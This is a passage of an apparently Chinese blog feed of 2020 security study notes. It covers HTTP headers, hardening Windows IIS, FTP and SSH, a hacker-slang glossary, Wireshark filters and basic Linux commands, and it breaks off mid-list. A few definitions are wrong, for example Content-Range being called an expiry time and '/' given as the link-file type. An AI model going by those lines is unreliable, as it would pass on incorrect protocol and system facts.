&lt;p&gt;&lt;strong&gt;x-CSRF-token&lt;&#x2F;strong&gt;：用于解决CSRF跨站请求伪造攻击，通过token令牌解决&lt;&#x2F;p&gt;
&lt;p&gt;响应字段：&lt;&#x2F;p&gt;
&lt;p&gt;用于服务端根据用户请求做出响应&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Server&lt;&#x2F;strong&gt;：表示服务器的信息，为了安全性，可以关闭或修改&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;x-power-by&lt;&#x2F;strong&gt;：表示服务器程序版本，为了安全性，可以关闭或修改&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;set-cookie&lt;&#x2F;strong&gt;：服务器可以通过此字段，为客户端设置cookie信息，后续客户端根据此cookie进行访问&lt;&#x2F;p&gt;
&lt;p&gt;accept-ranges：表示是否接收字节范围请求&lt;&#x2F;p&gt;
&lt;p&gt;location：服务器告知客户端去哪里访问这个资源，一般用于重定向，配合状态码302使用&lt;&#x2F;p&gt;
&lt;p&gt;www-authenticate：服务器对客户端的认证信息&lt;&#x2F;p&gt;
&lt;p&gt;retry-after：对再次发起请求的要求&lt;&#x2F;p&gt;
&lt;p&gt;refresh：服务器告知客户端，定时刷新浏览器&lt;&#x2F;p&gt;
&lt;p&gt;ETag：表示资源的匹配信息&lt;&#x2F;p&gt;
&lt;p&gt;Vary：代理服务器缓存的管理信息&lt;&#x2F;p&gt;
&lt;p&gt;通用字段&lt;&#x2F;p&gt;
&lt;p&gt;可以存在于请求头和回复头&lt;&#x2F;p&gt;
&lt;p&gt;connection：用于表示连接是否可持续 keep-alive&#x2F;close&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Catche-control&lt;&#x2F;strong&gt;：用于控制缓存信息，no-cache：不缓存过期信息，no-store：不进行缓存&lt;&#x2F;p&gt;
&lt;p&gt;Transfer-encoding：表示输出的内容长度不定，需要分块处理。对于动态内容或者在发送数据前不能判定长度的情况下，可以使用分块的方法来传送，对于静态内容或者在发送数据可以预判长度的情况下，可以用content-length来标识&lt;&#x2F;p&gt;
&lt;p&gt;upgrade：升级为其他协议&lt;&#x2F;p&gt;
&lt;p&gt;Via：代理服务器的相关信息&lt;&#x2F;p&gt;
&lt;p&gt;Warning：错误信息通告&lt;&#x2F;p&gt;
&lt;p&gt;Date：表示内容产生的时间&lt;&#x2F;p&gt;
&lt;p&gt;实体字段：&lt;&#x2F;p&gt;
&lt;p&gt;可以存在于请求和相应报文中，针对实体内部进行描述。用于表示请求和相应正文的属性，包括介质类型，长度，压缩方法，最后一次修改时间等&lt;&#x2F;p&gt;
&lt;p&gt;Content-type：表示实体内容的介质类型&lt;&#x2F;p&gt;
&lt;p&gt;Content-encoding：表示实体内容的编码方式&lt;&#x2F;p&gt;
&lt;p&gt;Content-length：表示实体内容的长度&lt;&#x2F;p&gt;
&lt;p&gt;Content-language：表示实体内容的语言&lt;&#x2F;p&gt;
&lt;p&gt;Content-location：代替对应资源的URL&lt;&#x2F;p&gt;
&lt;p&gt;Content-MD5：表示实体内容的报文摘要&lt;&#x2F;p&gt;
&lt;p&gt;Content-range：表示实体内容的过期时间&lt;&#x2F;p&gt;
&lt;p&gt;last-modified：表示实体内容最后的更新时间&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>网络安全导论</title>
		<published>2020-08-01T00:00:00+00:00</published>
		<updated>2020-08-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/wang-luo-an-quan-dao-lun/" type="text/html"/>
		<id>https://baz.ee/wang-luo-an-quan-dao-lun/</id>
		<content type="html">&lt;p&gt;&lt;img src=&quot;images&#x2F;Untitled&#x2F;%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA.png&quot; alt=&quot;网络安全导论&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Windows系统服务</title>
		<published>2020-08-01T00:00:00+00:00</published>
		<updated>2020-08-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/windowsxi-tong-fu-wu/" type="text/html"/>
		<id>https://baz.ee/windowsxi-tong-fu-wu/</id>
		<content type="html">&lt;p&gt;Windows 系统服务&lt;&#x2F;p&gt;
&lt;p&gt;IIS服务&lt;&#x2F;p&gt;
&lt;p&gt;Internet information service就是一个www服务(world wide web)。ISS是一种web服务组件，其中包括web服务器，ftp服务器，分别用于网页浏览，文件传输。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;控制面板-程序-打开或关闭windows功能&lt;&#x2F;p&gt;
&lt;p&gt;开启了IIS之后，在浏览器里面输入http:&#x2F;&#x2F;localhost，如果可以看到IIS界面，那就说明服务已经开启&lt;&#x2F;p&gt;
&lt;p&gt;设置web页面&lt;&#x2F;p&gt;
&lt;p&gt;IIS开启成功之后，下一步就要把我们开发好的网站安装到web服务器的目录中，一般情况下，当web服务器安装成功后，会创建一个系统目录C:\inetpub\wwwroot，我们需要将开发好的网站放到这个路径下，即可实现本地访问&lt;&#x2F;p&gt;
&lt;p&gt;防火墙放行流量：&lt;&#x2F;p&gt;
&lt;p&gt;控制面板-系统和安全-windows防火墙-允许应用通过windows防火墙-万维网服务&lt;&#x2F;p&gt;
&lt;p&gt;FTP服务&lt;&#x2F;p&gt;
&lt;p&gt;右键我的电脑-管理-服务和应用程序-选择Internet信息服务iis管理，添加ftp站点&lt;&#x2F;p&gt;
&lt;p&gt;设置FTP账号&lt;&#x2F;p&gt;
&lt;p&gt;控制面板-管理工具-计算机管理-系统工具-本地用户和组-用户&lt;&#x2F;p&gt;
&lt;p&gt;防火墙放行FTP流量：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;放行FTP服务器&lt;&#x2F;li&gt;
&lt;li&gt;出站入站端口放行20、21端口&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;远程桌面&lt;&#x2F;p&gt;
&lt;p&gt;计算机-属性-远程设置-远程&lt;&#x2F;p&gt;
&lt;p&gt;SSH服务&lt;&#x2F;p&gt;
&lt;p&gt;设置-应用-应用和功能-管理可选功能-添加功能-open SSH服务端和客户端&lt;&#x2F;p&gt;
&lt;p&gt;然后使用管理员权限打开cmd，通过命令net start sshd开启ssh服务&lt;&#x2F;p&gt;
&lt;p&gt;客户端ssh命令：ssh username@127.0.0.1&lt;&#x2F;p&gt;
&lt;p&gt;windows系统的安全配置：&lt;&#x2F;p&gt;
&lt;p&gt;账号管理：&lt;&#x2F;p&gt;
&lt;p&gt;密码复杂性要求：控制面板-管理工具-本地安全策略-账号策略-密码策略&lt;&#x2F;p&gt;
&lt;p&gt;强制密码历史：使用户不能重复使用最近多少次内已使用的口令&lt;&#x2F;p&gt;
&lt;p&gt;不存储LAN管理器哈希值：控制面板-管理工具-本地安全策略-安全选项-网络安全&lt;&#x2F;p&gt;
&lt;p&gt;失败认证次数：本地安全策略-账户策略-账户锁定策略&lt;&#x2F;p&gt;
&lt;p&gt;认证授权：&lt;&#x2F;p&gt;
&lt;p&gt;系统强制关机授权：控制面板-管理工具-本地安全策略-用户权限分配&lt;&#x2F;p&gt;
&lt;p&gt;关闭系统授权：&lt;&#x2F;p&gt;
&lt;p&gt;取得文件或其他对象所有权授权：&lt;&#x2F;p&gt;
&lt;p&gt;允许本地访问：&lt;&#x2F;p&gt;
&lt;p&gt;从网络访问此计算机：&lt;&#x2F;p&gt;
&lt;p&gt;日志配置：&lt;&#x2F;p&gt;
&lt;p&gt;控制面板-管理工具-本地安全策略-本地策略-审核策略-审核登录事件&lt;&#x2F;p&gt;
&lt;p&gt;查看系统日志：控制面板-管理工具-组件服务-事件查看器（本地）-Windows日志&lt;&#x2F;p&gt;
&lt;p&gt;Windows服务&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1&#x2F;image-20200731172723579.png&quot; alt=&quot;image-20200731172723579&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1&#x2F;image-20200731172740347.png&quot; alt=&quot;image-20200731172740347&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;批量关闭端口操作略&lt;&#x2F;p&gt;
&lt;p&gt;关闭系统无效启动项：运行里面输入msconfig&lt;&#x2F;p&gt;
&lt;p&gt;文件共享&lt;&#x2F;p&gt;
&lt;p&gt;关闭Windows硬盘默认共享：&lt;&#x2F;p&gt;
&lt;p&gt;开始-运行-输入regedit进入注册表编辑器&lt;&#x2F;p&gt;
&lt;p&gt;HKLM\System\CurrentControlSet\ Services\LanmanServer\Parameters\下，增加REG_DWORD类型的AutoShareServer 键，值为 0&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1&#x2F;image-20200731172831315.png&quot; alt=&quot;image-20200731172831315&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;设置共享文件夹访问权限&lt;&#x2F;p&gt;
&lt;p&gt;路径：控制面板-管理工具-计算机管理-系统工具-共享文件夹-共享&lt;&#x2F;p&gt;
&lt;p&gt;其他安全设置：&lt;&#x2F;p&gt;
&lt;p&gt;会话超时设置：&lt;&#x2F;p&gt;
&lt;p&gt;对于远程登录的账户，如果在15分钟内没有操作就端开连接&lt;&#x2F;p&gt;
&lt;p&gt;控制面板-管理工具-本地安全策略-本地策略-安全选项-Microsoft网络服务器：暂停会话前所需的时间数量 &lt;&#x2F;p&gt;
&lt;p&gt;源路由欺骗保护：&lt;&#x2F;p&gt;
&lt;p&gt;HKLM\System\CurrentControlSet\ Services\Tcpip\Parameters&lt;&#x2F;p&gt;
&lt;p&gt;新建REG_DWORD：DisableIPSourceRouting，值设置为2。&lt;&#x2F;p&gt;
&lt;p&gt;碎片攻击保护：&lt;&#x2F;p&gt;
&lt;p&gt;在HKLM\System\CurrentControlSet\ Services\Tcpip\Parameters\创建REG_DWORD格式的EnablePMTUDiscovery，值设置为1。&lt;&#x2F;p&gt;
&lt;p&gt;Synflood攻击保护：&lt;&#x2F;p&gt;
&lt;p&gt;在HKLM\System\CurrentControlSet\ Services\Tcpip\Parameters\创建格式为REG_DWORD的注册表项SynAttackProtect，值设置为2 。&lt;&#x2F;p&gt;
&lt;p&gt;设置TCP半开会话最大数目：&lt;&#x2F;p&gt;
&lt;p&gt;在HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\创建格式为REG_DWORD的注册表项TcpMaxHalfOpen，值设置为100 或 500。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>术语</title>
		<published>2020-08-01T00:00:00+00:00</published>
		<updated>2020-08-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/zhu-yu/" type="text/html"/>
		<id>https://baz.ee/zhu-yu/</id>
		<content type="html">&lt;h3 id=&quot;rou-ji&quot;&gt;肉鸡&lt;&#x2F;h3&gt;
&lt;p&gt;已经被黑客控制的计算机就叫肉鸡，通常是因为计算机存在已知漏洞或者中毒了。黑客找存在漏洞的机器这一行为被称为抓鸡。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;hou-men&quot;&gt;后门&lt;&#x2F;h3&gt;
&lt;p&gt;黑客第一次控制计算机以后，为了下次更方便的操作肉鸡，会留下不容易发现的特定的程序如远程控制程序，来方便以后的访问。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;h3 id=&quot;mian-sha&quot;&gt;免杀&lt;&#x2F;h3&gt;
&lt;p&gt;病毒木马之类的程序通常会被杀毒软件查杀，免杀技术就是为了对抗杀软而产生的技术。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ku-zi&quot;&gt;裤子&lt;&#x2F;h3&gt;
&lt;p&gt;指存入数据库的信息。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;tuo-ku&quot;&gt;脱裤&lt;&#x2F;h3&gt;
&lt;p&gt;盗走数据库中存入的信息。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;xi-ku&quot;&gt;洗裤&lt;&#x2F;h3&gt;
&lt;p&gt;通过黑色产业链将有价值的用户数据变现。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;zhuang-ku&quot;&gt;撞库&lt;&#x2F;h3&gt;
&lt;p&gt;使用脱裤得来的用户账户和密码，去登录其他网站的攻击行为。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ruo-kou-ling&quot;&gt;弱口令&lt;&#x2F;h3&gt;
&lt;p&gt;强度较低的密码，如“123456”、“qwer1234”等。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;nei-wang-wai-wang&quot;&gt;内网外网&lt;&#x2F;h3&gt;
&lt;p&gt;内网即局域网、外网即互联网。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;duan-kou&quot;&gt;端口&lt;&#x2F;h3&gt;
&lt;p&gt;通常我们说的端口是指网络端口中的 tcp&#x2F;ip 协议端口，端口范围为 0 到 65535 的整数。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;yu-ming&quot;&gt;域名&lt;&#x2F;h3&gt;
&lt;p&gt;类似“.com”、“.cn”的叫顶级域名，“baidu.com”叫二级域名，“www.baidu.com”叫三级域名。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;yu-ming-jie-xi&quot;&gt;域名解析&lt;&#x2F;h3&gt;
&lt;p&gt;域名解析是把域名指向网站 ip 地址的服务，因为 ip 地址不方便记忆，因此需要域名辅助记忆。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;shu-ju-ku&quot;&gt;数据库&lt;&#x2F;h3&gt;
&lt;p&gt;用来存储大量数据的专有程序，常见数据库有：“MySQL”、“oracle”、“SQLserver”等。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ke-hu-duan&quot;&gt;客户端&lt;&#x2F;h3&gt;
&lt;p&gt;提供本地服务的程序，也称为用户端。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fu-wu-qi&quot;&gt;服务器&lt;&#x2F;h3&gt;
&lt;p&gt;提供计算服务的设备，一般放在机房内。服务器的构成包括处理器、硬盘、内容、系统总线等。形状像长方形的铁盒子。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;jia-mi-suan-fa&quot;&gt;加密算法&lt;&#x2F;h3&gt;
&lt;p&gt;数据加密的基本方法就是对原来为明文的数据按照某种算法进行处理，使之成为不可读的一段密文，密文只能在输入相应的密钥后才能显示出本来内容，以此来保证数据的安全。由于算法的不同，加密分为对称加密和非对称加密。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;mi-yao&quot;&gt;密钥&lt;&#x2F;h3&gt;
&lt;p&gt;是一种在明文转换成密文或密文转换成明文时输入的参数。比如解压被加密的压缩文件时输入的密码，即为密钥。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;dui-cheng-jia-mi&quot;&gt;对称加密&lt;&#x2F;h3&gt;
&lt;p&gt;加密和解密使用同一个密钥的即为对称加密。比如加密压缩文件时，使用密码“123456”对文件进行加密，然后解密时，输入密码“123456”即可进行解密。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fei-dui-cheng-jia-mi&quot;&gt;非对称加密&lt;&#x2F;h3&gt;
&lt;p&gt;加密和解密时使用的不是同一个密钥即为非对称加密，通常有两个密钥，称为“公钥”和“私钥”，公钥和私钥总是承兑出现的。公钥是对外公布的，每个人都可以知道，私钥则不能公开。由于解密端不知道私钥，因此私钥可以“签名数据”，数据无法被（只拿到公钥的人）伪造，公钥可以“认证”数据，确信数据的来源是可靠的。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;zi-dian&quot;&gt;字典&lt;&#x2F;h3&gt;
&lt;p&gt;通常指存储了大量（明文）密码的集合。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;cai-hong-biao&quot;&gt;彩虹表&lt;&#x2F;h3&gt;
&lt;p&gt;一种用于加密散列函数逆运算的预先计算好的表，是为破甲密码的散列值而准备的。上述定义不太好理解，可以简单的认为，彩虹表就是存储了大量密文（密码）的字典。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>VMWARE的三种连接方式</title>
		<published>2020-07-29T00:00:00+00:00</published>
		<updated>2020-07-29T00:00:00+00:00</updated>
		<link href="https://baz.ee/vmwarede-san-chong-lian-jie-fang-shi/" type="text/html"/>
		<id>https://baz.ee/vmwarede-san-chong-lian-jie-fang-shi/</id>
		<content type="html">&lt;p&gt;&lt;img src=&quot;images&#x2F;VMWARE%E7%9A%84%E4%B8%89%E7%A7%8D%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F&#x2F;20191002161534214.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;VMWARE%E7%9A%84%E4%B8%89%E7%A7%8D%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F&#x2F;20191002171353843.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;VMWARE%E7%9A%84%E4%B8%89%E7%A7%8D%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F&#x2F;20191002172653449.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Whireshark</title>
		<published>2020-07-28T00:00:00+00:00</published>
		<updated>2020-07-28T00:00:00+00:00</updated>
		<link href="https://baz.ee/wireshark/" type="text/html"/>
		<id>https://baz.ee/wireshark/</id>
		<content type="html">&lt;p&gt;Whireshark安装与使用&lt;&#x2F;p&gt;
&lt;p&gt;抓包过滤器语法：&lt;&#x2F;p&gt;
&lt;p&gt;Type：host net port&lt;&#x2F;p&gt;
&lt;p&gt;方向：src dst&lt;&#x2F;p&gt;
&lt;p&gt;协议：ether ip tcp udp http ftp 等&lt;&#x2F;p&gt;
&lt;p&gt;逻辑运算符：与 &amp;amp;&amp;amp;    或||    非！&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;显示过滤器语法： &lt;&#x2F;p&gt;
&lt;p&gt;逻辑操作符：and or not xor&lt;&#x2F;p&gt;
&lt;p&gt;比较操作符：==     ！    =&lt;&#x2F;p&gt;
&lt;p&gt;ip地址：ip.addr  ip.src  ip.dst&lt;&#x2F;p&gt;
&lt;p&gt;端口过滤：tcp.port    tcp.srcport    tcp.dstport    udp.port    tcp.flag.syn &lt;&#x2F;p&gt;
&lt;p&gt;协议过滤：arp   ip   icmp   udp   tcp   bootp(dhcp)   dns&lt;&#x2F;p&gt;
&lt;p&gt;高级功能：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;数据流追踪：将TCP UDP ssl等数据进行重组并完整的呈现出来&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-分析-追踪TCP流&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;协议分层统计：通信流中不同协议占用的百分比&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-统计-协议分层&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;网络会话统计：统计会话之间接收和发送的数据包和字节数&lt;&#x2F;p&gt;
&lt;p&gt;统计-会话&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;网络节点统计：统计会话中每个节点接收和发送的数据包和字节数&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-统计-终端节点&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;IO图表统计：对网络中的吞吐流量进行实时的图形统计&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-统计-IO图表&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;数据流图分析：将会话通信通过图形可视化显示出来&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-统计-流量图表&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;数据包的长度统计：统计数据流中包长度的分布&lt;&#x2F;p&gt;
&lt;p&gt;菜单栏-统计-包长度&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Kali Linux</title>
		<published>2020-07-25T00:00:00+00:00</published>
		<updated>2020-07-25T00:00:00+00:00</updated>
		<link href="https://baz.ee/kali-linux/" type="text/html"/>
		<id>https://baz.ee/kali-linux/</id>
		<content type="html">&lt;h1 id=&quot;linuxmu-lu-jie-gou&quot;&gt;Linux目录结构&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;核心思想：一切皆文件&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;![](images&#x2F;Kali Linux&#x2F;1038b33437c725c8cc66852e4745d20.png)&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;linuxwen-jian-ji-ben-shu-xing&quot;&gt;Linux文件基本属性&lt;&#x2F;h1&gt;
&lt;p&gt;Linux是一种典型的多用户系统，终端情况下，可同时登录多个用户。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;0   位   确定文件类型&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;1-3 位   确定属主（该文件的所有者）拥有该文件的权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;4-6 位   确定属组（所有者的同组用户）拥有该文件的权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;7-9 位   确定其他用户拥有该文件的权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件类型：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;d 表示目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- 表示文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F; 表示链接文档（link file）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;b 表示装置文件里面的可供储存的接口设备（可随机存储装置）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c 表示装置文件里面的串行端口设备，例如键盘、鼠标（一次性读取装置）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件权限：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;r read 4&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;w write 2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x execute 1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;linuxwen-jian-cao-zuo&quot;&gt;Linux文件操作&lt;&#x2F;h1&gt;
&lt;h3 id=&quot;linuxji-chu-ming-ling&quot;&gt;Linux基础命令&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;文件管理：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;whatis&amp;lt;command&amp;gt;     查看命令的作用&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ls                  列出当前目录下的内容&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ls -a               列出所有文件，包括隐藏文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ls -l               列出常数据串（文件属性和权限）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ls -al              &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ls -al&amp;lt;目录&amp;gt;         &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;man&amp;lt;command&amp;gt;        查询命令的说明文档&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;which               查看文件所在的路径&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cd                  进入指定目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;                   根目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;~                   当前的用户目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;.                   当前目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;..                  上级目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pwd                 显示当前的路径&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mkdir               创建一个新目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mkdir -m 666        创建并赋予权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mkdir -p ......     递归创建&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;touch               创建一个新的文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat                 查看文件内容&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cp 源文件 目标文件    复制文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mv 源文件 目标文件    移动（或重命名）文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mv -f               强制移动，不会询问是否覆盖&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mv -i               若目标文件存在，询问是否存在&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mv -u               若目标文件存在，且源文件比较新，才会更新&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mv &#x2F;dir&#x2F;* .       将目录dir下的文件移动到当前目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file&amp;lt;file&amp;gt;          显示指定文件的文件类型&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file -i&amp;lt;显示&amp;gt;        显示MIME类别&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;chmod               修改文件权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;chmod + ...&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;chown               将指定文件的拥有者改为指定的用户和 用户组，用户可以是用户名或者用户id，组可以使用组名或者组id&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;su root             变更使用者身份&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;su pinginglab       变更使用者身份&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo                以管理员权限执行命令&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo -l             列出当前的权限&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;etc&#x2F;sudoers&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;chown -R            更改指定目录下的所有文件及其子文件的拥有者和所属组&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;chown -R xxx:xxx*   更改当前目录下的所有文件及其子文件的拥有者和所属组&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rmdir               删除空目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rmdir *             删除所有空目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cp 源 目             复制文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cp -i 源 目          若目存在，则覆盖时会询问&lt;&#x2F;span&gt;&lt;span&gt;
